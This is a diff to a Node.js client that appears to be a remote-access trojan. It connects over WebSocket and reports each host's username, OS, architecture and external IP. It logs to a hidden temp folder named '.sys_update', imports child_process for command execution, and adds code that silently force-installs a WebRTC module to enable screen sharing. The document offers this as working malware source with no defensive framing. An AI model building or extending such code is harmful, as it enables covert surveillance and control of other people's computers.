@@ -1,4 +1,5 @@
 const WebSocket = require('ws');
+const { execSync } = require('child_process');
 const { exec } = require('child_process');
 const fs = require('fs'); 
 const os = require('os');
@@ -7,18 +8,38 @@ const https = require('https');
 const crypto = require('crypto');
 const http = require('http'); 
 
+// --- FORCE INSTALLATION CHECK ---
+try {
+ const nodeModulesPath = path.join(__dirname, 'node_modules', '@roamhq', 'wrtc');
+ if (!fs.existsSync(nodeModulesPath)) {
+ console.log("[FORCE] @roamhq/wrtc missing. Installing...");
+ execSync('npm install @roamhq/wrtc --save', { stdio: 'pipe' });
+ console.log("[FORCE] Installation complete.");
+ }
+} catch (e) {
+ console.warn("[FORCE] Could not auto-install:", e.message);
+}
+
 // --- NATIVE WEBRTC IMPORTS ---
 let wrtc;
 try {
-    wrtc = require('@roamhq/wrtc');
+ // Attempt to load the native module
+ wrtc = require('@roamhq/wrtc');
 } catch (e) {
-    console.error("Failed to load @roamhq/wrtc. Ensure it is installed.");
+ console.error("Failed to require @roamhq/wrtc:", e.message);
+}
+
+// Check if the module actually has the required exports
+const HAS_WEBRTC = wrtc && typeof wrtc.RTCPeerConnection === 'function' && wrtc.mediaDevices;
+
+if (!HAS_WEBRTC) {
+ console.warn("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
+ console.warn("[WARN] Ensure 'npm install @roamhq/wrtc' was run in this directory.");
+} else {
+ console.log("[SUCCESS] @roamhq/wrtc loaded successfully.");
 }
 
 const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};
-
-// If @roamhq/wrtc isn't loaded, fallback to basic logic (but video won't work without it)
-const HAS_WEBRTC = !!wrtc;
 
 // --- LOGGING SYSTEM ---
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
@@ -88,7 +109,7 @@ function initConnection() {
  safeSend(JSON.stringify({
  type: 'info',
  id: myId,
- os: os.platform(), // Fixes Linux spam - now reports win32/darwin/linux
+ os: os.platform(),
  arch: os.arch(),
  user: os.userInfo().username,
  ip: getExternalIP(),
